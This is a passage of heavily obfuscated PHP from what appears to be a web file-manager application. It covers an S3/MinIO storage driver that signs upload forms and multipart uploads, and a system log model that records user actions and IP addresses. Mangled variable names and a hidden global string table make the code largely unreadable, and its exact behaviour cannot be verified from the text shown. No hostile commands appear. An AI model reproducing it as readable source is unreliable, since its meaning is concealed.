array($üãİ¿†â[270], $üãİ¿†â[271], $üãİ¿†â[12]), array($üãİ¿†â[270], $üãİ¿†â[272], $üãİ¿†â[12]), array($üãİ¿†â[273] => $î´¡á’é), array($üãİ¿†â[274] => $¬‰çòá), array($üãİ¿†â[275] => $áôŠæ¾è), array($üãİ¿†â[276] => $â¶¸¨Ûé), array($üãİ¿†â[277] => $‡û¢ÉÁş))); $‡œ´õ´õ = base64_encode(json_encode($ò‚³ü•‹)); $¸Ö÷î€í = hash_hmac($üãİ¿†â[278], $ßıİíÌş, $üãİ¿†â[279] . $this->secret, !0); $üŸÆã = hash_hmac($üãİ¿†â[278], $this->region, $¸Ö÷î€í, !0); $İ…Õ‰Ò— = hash_hmac($üãİ¿†â[278], $ë°–›Æ‡, $üŸÆã, !0); $¾ô¸°º = hash_hmac($üãİ¿†â[278], $ãÚ³§º, $İ…Õ‰Ò—, !0); $…¢•¹“” = hash_hmac($üãİ¿†â[278], $‡œ´õ´õ, $¾ô¸°º); $Æ©®œ¢Ô = array($üãİ¿†â[249] => $üãİ¿†â[12], $üãİ¿†â[273] => $î´¡á’é, $üãİ¿†â[280] => $‡œ´õ´õ, $üãİ¿†â[274] => $¬‰çòá, $üãİ¿†â[275] => $áôŠæ¾è, $üãİ¿†â[276] => $â¶¸¨Ûé, $üãİ¿†â[277] => $‡û¢ÉÁş, $üãİ¿†â[281] => $…¢•¹“”, $üãİ¿†â[259] => $üãİ¿†â[250], $üãİ¿†â[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($Æ©®œ¢Ô[$üãİ¿†â[259]]); } return $Æ©®œ¢Ô; } public function uploadMultiData($É¦±úçğ, $–±¥ŠÁº = 3600) { $õ­íŒà© =& $_SERVER[ÓïÕü]; $ÙİŸòÅ = $this->signVer == $õ­íŒà©[250] ? gmdate($õ­íŒà©[282]) : gmdate($õ­íŒà©[283]); $ĞÈ»Ø­’ = array(); $õİ–çÎ€ = $this->client->getUploadId($this->bucket, $É¦±úçğ, $ĞÈ»Ø­’); if (!$õİ–çÎ€) { return !1; } $Ï™ó¿’ç = array($õ­íŒà©[284] => $õİ–çÎ€, $õ­íŒà©[209] => $this->getHost() . $õ­íŒà©[8] . $this->pathEncode($É¦±úçğ), $õ­íŒà©[285] => $ÙİŸòÅ, $õ­íŒà©[97] => $É¦±úçğ, $õ­íŒà©[259] => $this->signVer); if ($this->_isClientAsync()) { unset($Ï™ó¿’ç[$õ­íŒà©[259]]); } return $Ï™ó¿’ç; } public function uploadMultiAuth($ô…òÏ, $š»°öÇÑ = array()) { $©æ²“æ¨ =& $_SERVER[ÓïÕü]; if ($this->signVer == $©æ²“æ¨[250]) { if (isset($š»°öÇÑ[$©æ²“æ¨[286]])) { return $this->uploadPartAuthV2($ô…òÏ, $š»°öÇÑ); } return $this->uploadListAuthV2($ô…òÏ, $š»°öÇÑ); } if (isset($š»°öÇÑ[$©æ²“æ¨[286]])) { return $this->uploadPartAuthV4($ô…òÏ, $š»°öÇÑ); } return $this->uploadListAuthV4($ô…òÏ, $š»°öÇÑ); } public function uploadPartAuthV2($Âû°Ë•¤, $¼³¯×·Í = array()) { $âÕòñ”Í =& $_SERVER[ÓïÕü]; $¦Ê›ò‰é = $¼³¯×·Í[$âÕòñ”Í[97]]; $èËĞÃÛ = gmdate($âÕòñ”Í[282]); $š÷‚–ôî = array_intersect_key($¼³¯×·Í, array_flip(array($âÕòñ”Í[286], $âÕòñ”Í[284]))); ksort($š÷‚–ôî); $×¨²œÈÍ = $š÷‚–ôî ? $âÕòñ”Í[76] . http_build_query($š÷‚–ôî, null, $âÕòñ”Í[287], PHP_QUERY_RFC3986) : $âÕòñ”Í[12]; $Æ‡İ‹”Ä = array($âÕòñ”Í[256], $âÕòñ”Í[12], $âÕòñ”Í[123], $âÕòñ”Í[12], "\x78\55\x61\x6d\172\55\x64\x61\x74\145\x3a{$èËĞÃÛ}", $âÕòñ”Í[8] . $this->bucket . $âÕòñ”Í[8] . $this->pathEncode($¦Ê›ò‰é) . $×¨²œÈÍ); $âšœ¡»Î = implode($âÕòñ”Í[288], $Æ‡İ‹”Ä); $ïù”Ğ½ = $this->client->__getSignature($âšœ¡»Î); return array($âÕòñ”Í[289] => $ïù”Ğ½, $âÕòñ”Í[285] => $èËĞÃÛ); } public function uploadListAuthV2($­óúØàò, $Øú›’¾Í = array()) { $˜ú¼©¿© =& $_SERVER[ÓïÕü]; $ö† ·”Å = $Øú›’¾Í[$˜ú¼©¿©[97]]; $á‹îö¬¹ = $Øú›’¾Í[$˜ú¼©¿©[284]]; $š©¯Úıæ = $this->client->listParts($this->bucket, $ö† ·”Å, $á‹îö¬¹); if (!$š©¯Úıæ) { return !1; } $‘Á¥›Ûú = gmdate($˜ú¼©¿©[282]); $á³İƒå = $˜ú¼©¿©[290] . $á‹îö¬¹; $´¢…¢©¹ = array($˜ú¼©¿©[291], $˜ú¼©¿©[12], $˜ú¼©¿©[123], $˜ú¼©¿©[12], "\x78\55\x61\x6d\x7a\55\144\141\x74\145\x3a{$‘Á¥›Ûú}", $˜ú¼©¿©[8] . $this->bucket . $˜ú¼©¿©[8] . $this->pathEncode($ö† ·”Å) . $á³İƒå); $ìÉœÒ = implode($˜ú¼©¿©[288], $´¢…¢©¹); $Á©ğ¨œŒ = $this->client->__getSignature($ìÉœÒ); return array($˜ú¼©¿©[289] => $Á©ğ¨œŒ, $˜ú¼©¿©[285] => $‘Á¥›Ûú, $˜ú¼©¿©[292] => $š©¯Úıæ); } public function uploadPartAuthV4($îœ®ôÚ†, $É–Ê¬– = array()) { $ì€ôß»‘ =& $_SERVER[ÓïÕü]; $à­ì† = $É–Ê¬–[$ì€ôß»‘[97]]; $Ø¥·àó‚ = array($ì€ôß»‘[276] => gmdate($ì€ôß»‘[283]), $ì€ôß»‘[293] => _get($É–Ê¬–, $ì€ôß»‘[294], hash($ì€ôß»‘[278], $ì€ôß»‘[12]))); $º£Ó”¹¢ = explode($ì€ôß»‘[211], $this->getHost()); $µ©ğıı = array($ì€ôß»‘[295] => $º£Ó”¹¢[1], $ì€ôß»‘[296] => $ì€ôß»‘[12], $ì€ôß»‘[249] => $ì€ôß»‘[123], $ì€ôß»‘[297] => $É–Ê¬–[$ì€ôß»‘[79]]); $„œ‡­Öœ = $ì€ôß»‘[256]; $óìœ¦¹É = $ì€ôß»‘[8] . $this->pathEncode($à­ì†); $«ÛŠ³İÅ = array_intersect_key($É–Ê¬–, array_flip(array($ì€ôß»‘[286], $ì€ôß»‘[284]))); $†ü¾»Ù = $this->client->__getSignatureV4($Ø¥·àó‚, $µ©ğıı, $„œ‡­Öœ, $óìœ¦¹É, $«ÛŠ³İÅ); return array($ì€ôß»‘[289] => $†ü¾»Ù, $ì€ôß»‘[293] => $Ø¥·àó‚[$ì€ôß»‘[293]], $ì€ôß»‘[285] => $Ø¥·àó‚[$ì€ôß»‘[276]]); } public function uploadListAuthV4($Ş¦ÇØçö, $¥€À§ƒÀ = array()) { $²£ãƒ¡è =& $_SERVER[ÓïÕü]; $¹›üºûî = $¥€À§ƒÀ[$²£ãƒ¡è[97]]; $Ì…Æå¢ = $¥€À§ƒÀ[$²£ãƒ¡è[284]]; $ûûë¼¼… = $this->client->listParts($this->bucket, $¹›üºûî, $Ì…Æå¢); if (!$ûûë¼¼…) { return !1; } $§Áåë = $²£ãƒ¡è[298]; foreach ($ûûë¼¼… as $öƒÕª­Ó) { $§Áåë .= $²£ãƒ¡è[299] . "\74\120\x61\162\164\x4e\165\155\142\x65\x72\76{$öƒÕª­Ó[$²£ãƒ¡è[300]]}\x3c\57\120\x61\162\x74\x4e\x75\155\142\145\x72\x3e\12" . "\74\105\x54\141\147\x3e{$öƒÕª­Ó[$²£ãƒ¡è[301]]}\x3c\x2f\105\x54\141\x67\76\12" . $²£ãƒ¡è[302]; } $§Áåë .= $²£ãƒ¡è[303]; $Ï”ñ¿ŒÃ = array($²£ãƒ¡è[276] => gmdate($²£ãƒ¡è[283]), $²£ãƒ¡è[293] => hash($²£ãƒ¡è[278], $§Áåë)); $×Ãæë» = explode($²£ãƒ¡è[211], $this->getHost()); $Šêı©©ä = array($²£ãƒ¡è[295] => $×Ãæë»[1], $²£ãƒ¡è[249] => $²£ãƒ¡è[123], $²£ãƒ¡è[297] => strlen($§Áåë)); $Î€šìÙ = $²£ãƒ¡è[291]; $Úøë¢íø = $²£ãƒ¡è[8] . $this->pathEncode($¹›üºûî); $ÃüáîÒŸ = array($²£ãƒ¡è[284] => $Ì…Æå¢); $şº•¤‹€ = $this->client->__getSignatureV4($Ï”ñ¿ŒÃ, $Šêı©©ä, $Î€šìÙ, $Úøë¢íø, $ÃüáîÒŸ); return array($²£ãƒ¡è[289] => $şº•¤‹€, $²£ãƒ¡è[293] => $Ï”ñ¿ŒÃ[$²£ãƒ¡è[293]], $²£ãƒ¡è[285] => $Ï”ñ¿ŒÃ[$²£ãƒ¡è[276]], $²£ãƒ¡è[292] => $ûûë¼¼…); } private function _isClientAsync() { $™óŞ‰£€ =& $_SERVER[ÓïÕü]; static $Âƒ¹œÙ§ = null; if ($Âƒ¹œÙ§ === null) { $› ÜÆÔ = isset($_REQUEST[$™óŞ‰£€[304]]) ? json_decode($_REQUEST[$™óŞ‰£€[304]], !0) : !1; $Âƒ¹œÙ§ = $› ÜÆÔ && _get($› ÜÆÔ, $™óŞ‰£€[305]) == $™óŞ‰£€[306]; } return $Âƒ¹œÙ§; } public function getHost() { $ŞùÄÎ¼© =& $_SERVER[ÓïÕü]; $«ÊƒÜ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ŞùÄÎ¼©[70], $ŞùÄÎ¼©[64], $ŞùÄÎ¼©[69], $ŞùÄÎ¼©[62]))) { return $«ÊƒÜ . $ŞùÄÎ¼©[8] . $this->bucket; } if ($this->osType == $ŞùÄÎ¼©[62] && !is_domain($«ÊƒÜ)) { return $«ÊƒÜ . $ŞùÄÎ¼©[8] . $this->bucket; } $«ÊƒÜ = explode($ŞùÄÎ¼©[211], $«ÊƒÜ); return $«ÊƒÜ[0] . $ŞùÄÎ¼©[211] . $this->bucket . $ŞùÄÎ¼©[10] . $«ÊƒÜ[1]; } public function size($•Ïş²š°) { $±ıƒ· = $this->objectMeta($•Ïş²š°); return $±ıƒ· ? $±ıƒ·[$_SERVER[ÓïÕü][79]] : 0; } public function info($¯áåÄÂ) { if ($this->isFolder($¯áåÄÂ)) { return $this->folderInfo($¯áåÄÂ); } else { if ($this->isFile($¯áåÄÂ)) { return $this->fileInfo($¯áåÄÂ); } } return !1; } public function exist($˜ç“Û€ğ) { return $this->isFile($˜ç“Û€ğ) || $this->isFolder($˜ç“Û€ğ); } public function isFile($ÎšÆã«) { return !$this->isFolder($ÎšÆã«) && $this->objectMeta($ÎšÆã«); } public function isFolder($ë‰ëò•Ù) { return $this->cacheMethod($_SERVER[ÓïÕü][180], $ë‰ëò•Ù); } protected function objectMeta($Õ¦ «ì±) { return $this->cacheMethod($_SERVER[ÓïÕü][182], $Õ¦ «ì±); } protected function _objectMeta($ãÏğşÏœ) { $Ë§¸Û° =& $_SERVER[ÓïÕü]; $ãÏğşÏœ = rtrim($ãÏğşÏœ, $Ë§¸Û°[8]); try { $ÕİÚ£â´ = $this->client->getObjectInfo($this->bucket, $ãÏğşÏœ); if (!isset($ÕİÚ£â´[$Ë§¸Û°[255]]) && isset($ÕİÚ£â´[$Ë§¸Û°[307]])) { $ÕİÚ£â´[$Ë§¸Û°[255]] = $ÕİÚ£â´[$Ë§¸Û°[307]]; } } catch (Exception $Ê³—Èñğ) { $ÕİÚ£â´ = !1; } if (!$ÕİÚ£â´) { } return $ÕİÚ£â´; } protected function _isFolder($¼ÛÇıÈ™) { $“¾«Ş” =& $_SERVER[ÓïÕü]; $¼ÛÇıÈ™ = rtrim($¼ÛÇıÈ™, $“¾«Ş”[8]) . $“¾«Ş”[8]; if ($¼ÛÇıÈ™ == $“¾«Ş”[12] || $¼ÛÇıÈ™ == $“¾«Ş”[8]) { return !0; } $ÎÔ»›³ = $this->client->getBucket($this->bucket, $¼ÛÇıÈ™, null, 1); if (empty($ÎÔ»›³[$“¾«Ş”[239]])) { return !1; } $úš¤Ê”¸ = $ÎÔ»›³[$“¾«Ş”[239]][0][$“¾«Ş”[32]]; return stripos($úš¤Ê”¸, $¼ÛÇıÈ™) === 0 ? !0 : !1; if (substr($úš¤Ê”¸, -1) == $“¾«Ş”[8]) { return !0; } if (get_path_this($úš¤Ê”¸) == get_path_this($¼ÛÇıÈ™)) { return !1; } return !0; } public function listObject($›à‚Àğ¿) { return $this->fileList($›à‚Àğ¿, $_SERVER[ÓïÕü][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($·ã¾ÑÍø) { $”ş¬ğ‰Ä =& $_SERVER[ÓïÕü]; parent::__construct($·ã¾ÑÍø); $this->setSignVersion($”ş¬ğ‰Ä[250]); if (!$this->region) { $this->region = $”ş¬ğ‰Ä[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $Â²É¦İ = $this->getBktRegion(); return $this->region == $Â²É¦İ ? !0 : !1; } public function uploadFormData($ŞĞò¶à›, $œšØÚ­ = 3600) { $ÓÇğ¬“ =& $_SERVER[ÓïÕü]; $·›¬Ö„× = $ÓÇğ¬“[232]; $àÚŠİæ‰ = $ÓÇğ¬“[260]; $¹ãî©· = $ÓÇğ¬“[62]; $‹Å÷ÑÅ‚ = gmdate($ÓÇğ¬“[261]); $ÑË˜×…· = gmdate($ÓÇğ¬“[262]); $·Òş Ôİ = $ÓÇğ¬“[263]; $×¦òïÄİ = $œšØÚ­ . $ÓÇğ¬“[12]; $€˜šã²½ = $ÓÇğ¬“[264]; $Óì‰©Ì = array($this->accessKey, $ÑË˜×…·, $this->region, $¹ãî©·, $·Òş Ôİ); $–àœÔÑà = implode($ÓÇğ¬“[8], $Óì‰©Ì); $™–†Ñ¬ = array($ÓÇğ¬“[265] => gmdate($ÓÇğ¬“[266], strtotime($ÓÇğ¬“[267])), $ÓÇğ¬“[268] => array(array($ÓÇğ¬“[269] => $this->bucket), array($ÓÇğ¬“[309] => $·›¬Ö„×), array($ÓÇğ¬“[270], $ÓÇğ¬“[271], $ÓÇğ¬“[12]), array($ÓÇğ¬“[270], $ÓÇğ¬“[272], $ÓÇğ¬“[12]), array($ÓÇğ¬“[270], $ÓÇğ¬“[310], $ÓÇğ¬“[12]), array($ÓÇğ¬“[273] => $€˜šã²½), array($ÓÇğ¬“[274] => $–àœÔÑà), array($ÓÇğ¬“[275] => $àÚŠİæ‰), array($ÓÇğ¬“[276] => $‹Å÷ÑÅ‚), array($ÓÇğ¬“[277] => $×¦òïÄİ))); $º³À”Ûš = base64_encode(json_encode($™–†Ñ¬)); $§É¥ó‚È = hash_hmac($ÓÇğ¬“[278], $ÑË˜×…·, $ÓÇğ¬“[279] . $this->secret, !0); $Â¤”äÁÄ = hash_hmac($ÓÇğ¬“[278], $this->region, $§É¥ó‚È, !0); $ÑæËğÅ = hash_hmac($ÓÇğ¬“[278], $¹ãî©·, $Â¤”äÁÄ, !0); $ÙòË’· = hash_hmac($ÓÇğ¬“[278], $·Òş Ôİ, $ÑæËğÅ, !0); $‰›İ‡ß = hash_hmac($ÓÇğ¬“[278], $º³À”Ûš, $ÙòË’·); $üÙÌ‡… = array($ÓÇğ¬“[249] => $ÓÇğ¬“[12], $ÓÇğ¬“[297] => $ÓÇğ¬“[12], $ÓÇğ¬“[309] => $·›¬Ö„×, $ÓÇğ¬“[273] => $€˜šã²½, $ÓÇğ¬“[280] => $º³À”Ûš, $ÓÇğ¬“[311] => $–àœÔÑà, $ÓÇğ¬“[312] => $àÚŠİæ‰, $ÓÇğ¬“[313] => $‹Å÷ÑÅ‚, $ÓÇğ¬“[314] => $×¦òïÄİ, $ÓÇğ¬“[315] => $‰›İ‡ß, $ÓÇğ¬“[209] => $this->getHost()); return $üÙÌ‡…; } } goto b±“Î¾İ; dµÄŒì ¡†: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\114\x69\x67\150\x74\x41\160\160"; public $modelType = "\x53\x79\163\164\x65\x6d\117\x70\x74\x69\157\x6e"; public $field = array("\156\141\x6d\145", "\x67\162\x6f\x75\x70", "\x64\145\163\x63", "\x63\x6f\156\164\145\156\x74"); public function listData($åÄ³‚Àñ = false, $üğâ­› = "\155\157\x64\x69\x66\171\124\151\x6d\x65", $ş”ãä‘¦ = true) { return parent::listData($åÄ³‚Àñ, $üğâ­›, $ş”ãä‘¦); } public function remove($œ¦¢êíÂ) { $¶Èü¡Ä¥ = $this->findByName($œ¦¢êíÂ); if (!$¶Èü¡Ä¥) { return !1; } return parent::remove($¶Èü¡Ä¥[$_SERVER[ÓïÕü][478]]); } public function add($ñ¤Õ“Ó) { if ($this->findByName($ñ¤Õ“Ó[$_SERVER[ÓïÕü][32]])) { return !1; } return parent::insert($ñ¤Õ“Ó); } public function update($¨êÉ Ó», $îš±Ò‚Å) { $çÁáíĞ¬ =& $_SERVER[ÓïÕü]; $Ì»§ıäó = $this->findByName($¨êÉ Ó»); $ûëĞåŠ = $this->findByName($îš±Ò‚Å[$çÁáíĞ¬[32]]); if (!$Ì»§ıäó || $ûëĞåŠ && $ûëĞåŠ[$çÁáíĞ¬[478]] != $Ì»§ıäó[$çÁáíĞ¬[478]]) { return !1; } return parent::update($Ì»§ıäó[$çÁáíĞ¬[478]], $îš±Ò‚Å); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\141\x74\x65\x54\151\155\145", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\165\x6e\x63\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $îªŠËã¬ =& $_SERVER[ÓïÕü]; return array($îªŠËã¬[2378] => LNG($îªŠËã¬[2379]), $îªŠËã¬[2380] => LNG($îªŠËã¬[2381]), $îªŠËã¬[1949] => LNG($îªŠËã¬[2382]), $îªŠËã¬[2383] => LNG($îªŠËã¬[2384]), $îªŠËã¬[2385] => LNG($îªŠËã¬[2386]), $îªŠËã¬[2387] => LNG($îªŠËã¬[2388]), $îªŠËã¬[2389] => LNG($îªŠËã¬[2390]), $îªŠËã¬[1979] => LNG($îªŠËã¬[2390]), $îªŠËã¬[1980] => LNG($îªŠËã¬[2391]), $îªŠËã¬[2392] => LNG($îªŠËã¬[2393]), $îªŠËã¬[2394] => LNG($îªŠËã¬[2395]), $îªŠËã¬[2396] => LNG($îªŠËã¬[2397]), $îªŠËã¬[2398] => LNG($îªŠËã¬[2399]), $îªŠËã¬[1977] => LNG($îªŠËã¬[2400]), $îªŠËã¬[2401] => LNG($îªŠËã¬[2402]), $îªŠËã¬[1984] => LNG($îªŠËã¬[2403]), $îªŠËã¬[2404] => LNG($îªŠËã¬[2405]), $îªŠËã¬[2406] => LNG($îªŠËã¬[2407]), $îªŠËã¬[2408] => LNG($îªŠËã¬[2409]), $îªŠËã¬[2410] => LNG($îªŠËã¬[2411]), $îªŠËã¬[1987] => LNG($îªŠËã¬[2412]), $îªŠËã¬[1988] => LNG($îªŠËã¬[2413]), $îªŠËã¬[2414] => LNG($îªŠËã¬[2415]), $îªŠËã¬[2416] => LNG($îªŠËã¬[2417]), $îªŠËã¬[2418] => LNG($îªŠËã¬[2419]), $îªŠËã¬[1982] => LNG($îªŠËã¬[2420]), $îªŠËã¬[2421] => LNG($îªŠËã¬[2422]), $îªŠËã¬[1981] => LNG($îªŠËã¬[2423]), $îªŠËã¬[2424] => LNG($îªŠËã¬[2424]), $îªŠËã¬[2425] => LNG($îªŠËã¬[2426]), $îªŠËã¬[2427] => LNG($îªŠËã¬[2424]), $îªŠËã¬[2428] => LNG($îªŠËã¬[2429]), $îªŠËã¬[2430] => LNG($îªŠËã¬[2431]), $îªŠËã¬[2432] => LNG($îªŠËã¬[2431]), $îªŠËã¬[2433] => LNG($îªŠËã¬[2434]), $îªŠËã¬[2435] => LNG($îªŠËã¬[2435]), $îªŠËã¬[2436] => LNG($îªŠËã¬[1953]), $îªŠËã¬[2437] => LNG($îªŠËã¬[2438]), $îªŠËã¬[2439] => LNG($îªŠËã¬[2440]), $îªŠËã¬[2441] => LNG($îªŠËã¬[2442]), $îªŠËã¬[2443] => LNG($îªŠËã¬[2444]), $îªŠËã¬[2445] => LNG($îªŠËã¬[2446]), $îªŠËã¬[2447] => LNG($îªŠËã¬[2447]), $îªŠËã¬[2448] => LNG($îªŠËã¬[2449]), $îªŠËã¬[2450] => LNG($îªŠËã¬[2451]), $îªŠËã¬[2452] => LNG($îªŠËã¬[2453]), $îªŠËã¬[2454] => LNG($îªŠËã¬[2455]), $îªŠËã¬[2456] => LNG($îªŠËã¬[2457]), $îªŠËã¬[2458] => LNG($îªŠËã¬[2459]), $îªŠËã¬[213] => LNG($îªŠËã¬[213]), $îªŠËã¬[214] => LNG($îªŠËã¬[2460]), $îªŠËã¬[2461] => LNG($îªŠËã¬[2461])); } private function typeFile() { $·™ğõ™Ù =& $_SERVER[ÓïÕü]; $÷ªï™ = array($·™ğõ™Ù[1984] => array($·™ğõ™Ù[1985]), $·™ğõ™Ù[2396] => array($·™ğõ™Ù[2462]), $·™ğõ™Ù[2398] => array($·™ğõ™Ù[2463]), $·™ğõ™Ù[1977] => array($·™ğõ™Ù[1978], $·™ğõ™Ù[2464]), $·™ğõ™Ù[2406] => array(), $·™ğõ™Ù[2408] => array(), $·™ğõ™Ù[2410] => array(), $·™ğõ™Ù[1987] => array($·™ğõ™Ù[1989]), $·™ğõ™Ù[1988] => array($·™ğõ™Ù[1989]), $·™ğõ™Ù[2414] => array($·™ğõ™Ù[2465]), $·™ğõ™Ù[2416] => array($·™ğõ™Ù[2465]), $·™ğõ™Ù[2418] => array($·™ğõ™Ù[2466]), $·™ğõ™Ù[2404] => array($·™ğõ™Ù[2467]), $·™ğõ™Ù[1982] => array($·™ğõ™Ù[2468]), $·™ğõ™Ù[2421] => array($·™ğõ™Ù[2469]), $·™ğõ™Ù[1981] => array($·™ğõ™Ù[1983])); return $÷ªï™; } private function typeAll() { $úéÊê¦Ñ =& $_SERVER[ÓïÕü]; $ÀÊØ¶¸£ = $this->typeList; $øãƒ´ = array_filter($this->typeFile()); foreach ($øãƒ´ as $Úıã×‘¡ => $Êà´‹Á) { $ÀÊØ¶¸£[$Êà´‹Á[0]] = $ÀÊØ¶¸£[$Úıã×‘¡]; } $ÀÊØ¶¸£[$úéÊê¦Ñ[1989]] = LNG($úéÊê¦Ñ[2470]); $ÀÊØ¶¸£[$úéÊê¦Ñ[2465]] = LNG($úéÊê¦Ñ[2471]); return $ÀÊØ¶¸£; } public function addLog($ƒíüóØ, $Óâş³â = array()) { $™ÓïàíÍ =& $_SERVER[ÓïÕü]; if (!isset($this->typeList[$ƒíüóØ])) { return; } $ü«ÎÍ‚’ = Session::get($™ÓïàíÍ[2147]); if (!$ü«ÎÍ‚’) { $ü«ÎÍ‚’ = _get($Óâş³â, $™ÓïàíÍ[1806], 0); } if ($ƒíüóØ == $™ÓïàíÍ[2437] && is_array($Óâş³â[$™ÓïàíÍ[2472]]) && !$Óâş³â[$™ÓïàíÍ[2472]]) { return; } $„˜æï‰‰ = get_client_ip(); if (!$Óâş³â || strlen(json_encode($Óâş³â)) >= 1024 * 64) { if ($Óâş³â && is_array($Óâş³â)) { $Óâş³â = array_intersect_key($Óâş³â, array_flip($™ÓïàíÍ[478], $™ÓïàíÍ[32])); $Óâş³â[$™ÓïàíÍ[2473]] = $„˜æï‰‰; } else { $Óâş³â = array($™ÓïàíÍ[2473] => $„˜æï‰‰); } } else { if (is_array($Óâş³â)) { $Óâş³â[$™ÓïàíÍ[2473]] = $„˜æï‰‰; } else { $Óâş³â = array($™ÓïàíÍ[1315] => $Óâş³â, $™ÓïàíÍ[2473] => $„˜æï‰‰); } } $Óâş³â = array($™ÓïàíÍ[1796] => Session::sign(), $™ÓïàíÍ[1797] => intval($ü«ÎÍ‚’), $™ÓïàíÍ[33] => $ƒíüóØ, $™ÓïàíÍ[1799] => json_encode($Óâş³â)); return parent::add($Óâş³â); } public function remove($«ºá¬ğÏ) { $this->where(array($_SERVER[ÓïÕü][496] => $«ºá¬ğÏ))->delete(); } private function _makeOrder($ÆÇ®†Í— = '') { $Ñ×éİ­ =& $_SERVER[ÓïÕü]; $«·¡ƒò = $Ñ×éİ­[234]; $÷Ç™úë = array($Ñ×éİ­[526] => $Ñ×éİ­[527], $Ñ×éİ­[528] => $Ñ×éİ­[529]); $¥‡ûêš‹ = Input::get($Ñ×éİ­[534], $Ñ×éİ­[7], $Ñ×éİ­[2187], array($Ñ×éİ­[2102], $Ñ×éİ­[528])); $¥‡ûêš‹ = $÷Ç™úë[$¥‡ûêš‹]; $ÆÇ®†Í— = $ÆÇ®†Í— . "{$«·¡ƒò}\40{$¥‡ûêš‹}"; return $this->order($ÆÇ®†Í—); } public function get($í¬€í€½ = '') { $¥ı¸³Õß =& $_SERVER[ÓïÕü]; if (!$í¬€í€½) { show_json(array()); } $õëë›ôŠ = array(); if ($í¬€í€½[$¥ı¸³Õß[1806]]) { $õëë›ôŠ[$¥ı¸³Õß[1806]] = $í¬€í€½[$¥ı¸³Õß[1806]]; } if (isset($í¬€í€½[$¥ı¸³Õß[851]])) { $‹³¿‡¼° = $í¬€í€½[$¥ı¸³Õß[851]]; $«áÔûäæ = isset($í¬€í€½[$¥ı¸³Õß[852]]) ? $í¬€í€½[$¥ı¸³Õß[852]] : time(); $õëë›ôŠ[$¥ı¸³Õß[234]] = array($¥ı¸³Õß[411], array($‹³¿‡¼°, $«áÔûäæ)); } if ($í¬€í€½[$¥ı¸³Õß[33]]) { $¯…ƒµÄ = explode($¥ı¸³Õß[50], $í¬€í€½[$¥ı¸³Õß[33]]); $„ŒÉÆ³Š = $this->typeFile(); $£Í¹ë­¹ = array(); foreach ($¯…ƒµÄ as $Âé¼„Ñ) { $£Í¹ë­¹[] = $Âé¼„Ñ; if (isset($„ŒÉÆ³Š[$Âé¼„Ñ])) { $£Í¹ë­¹ = array_merge($£Í¹ë­¹, $„ŒÉÆ³Š[$Âé¼„Ñ]); } } $£Í¹ë­¹ = array_unique($£Í¹ë­¹); if ($£Í¹ë­¹) { $õëë›ôŠ[$¥ı¸³Õß[33]] = array($¥ı¸³Õß[7], $£Í¹ë­¹); } } else { $õëë›ôŠ[$¥ı¸³Õß[33]] = array($¥ı¸³Õß[2474], $¥ı¸³Õß[2475]); } if (!empty($í¬€í€½[$¥ı¸³Õß[2473]])) { $õëë›ôŠ[$¥ı¸³Õß[529]] = array($¥ı¸³Õß[462], "\45{$í¬€í€½[$¥ı¸³Õß[2473]]}\45"); } $ƒàï”´Ê = $this->_makeOrder()->where($õëë›ôŠ)->selectPage(); if (empty($ƒàï”´Ê[$¥ı¸³Õß[448]])) { show_json(array(), !0, $ƒàï”´Ê[$¥ı¸³Õß[445]]); } $ƒàï”´Ê[$¥ı¸³Õß[448]] = $this->logList($ƒàï”´Ê[$¥ı¸³Õß[448]]); return $ƒàï”´Ê; } private function ipAddress(&$ŸÑ¸À‚©) { $ï³–¥¤§ =& $_SERVER[ÓïÕü]; if (!empty($ŸÑ¸À‚©[$ï³–¥¤§[2473]])) { $åİí÷•Ş = IpLocation::get($ŸÑ¸À‚©[$ï³–¥¤§[2473]]); } else { $åİí÷•Ş = LNG($ï³–¥¤§[2476]); } $ŸÑ¸À‚©[$ï³–¥¤§[2477]] = $åİí÷•Ş; } private function descZipDownload($¿ÇŸ®İš, &$ ‹ôô†) { $šÈÂ‹ìö =& $_SERVER[ÓïÕü]; if (!isset($¿ÇŸ®İš[$šÈÂ‹ìö[2478]])) { return; } $ù¦¯ŒÙŒ = json_decode($¿ÇŸ®İš[$šÈÂ‹ìö[2478]], !0); foreach ($ù¦¯ŒÙŒ as $ÖÁ†ËîŒ) { try { $Á¸×Óç = IO::infoFullSimple($ÖÁ†ËîŒ[$šÈÂ‹ìö[87]]); } catch (Exception $‘ôë§õæ) { continue; } $¿ÇŸ®İš[$šÈÂ‹ìö[87]] = $ÖÁ†ËîŒ[$šÈÂ‹ìö[87]]; $ ‹ôô†[] = $¿ÇŸ®İš[$šÈÂ‹ìö[194]] = $Á¸×Óç[$šÈÂ‹ìö[194]]; $ ‹ôô†[] = $¿ÇŸ®İš[$šÈÂ‹ìö[2241]] = $Á¸×Óç[$šÈÂ‹ìö[193]]; break; } return $¿ÇŸ®İš; } private function getSourceList(&$õ‘¶»ÈÔ) { $ÖîÔ†Ô =& $_SERVER[ÓïÕü]; $îâûËÖ‰ = array(); foreach ($õ‘¶»ÈÔ as $À‡»“ë† => $Ç»ôË®é) { $ëª‹Ö’‹ = json_decode($Ç»ôË®é[$ÖîÔ†Ô[529]], !0); if ($Ç»ôË®é[$ÖîÔ†Ô[33]] == $ÖîÔ†Ô[1980]) { $ëª‹Ö’‹ = $this->descZipDownload($ëª‹Ö’‹, $îâûËÖ‰); $õ‘¶»ÈÔ[$À‡»“ë†][$ÖîÔ†Ô[529]] = json_encode($ëª‹Ö’‹); continue; } if (strpos($Ç»ôË®é[$ÖîÔ†Ô[33]], $ÖîÔ†Ô[2243]) !== 0) { if (!isset($ëª‹Ö’‹[$ÖîÔ†Ô[87]]) || strpos($Ç»ôË®é[$ÖîÔ†Ô[33]], $ÖîÔ†Ô[2479]) !== 0) { continue; } try { $ëŠæä¯ä = 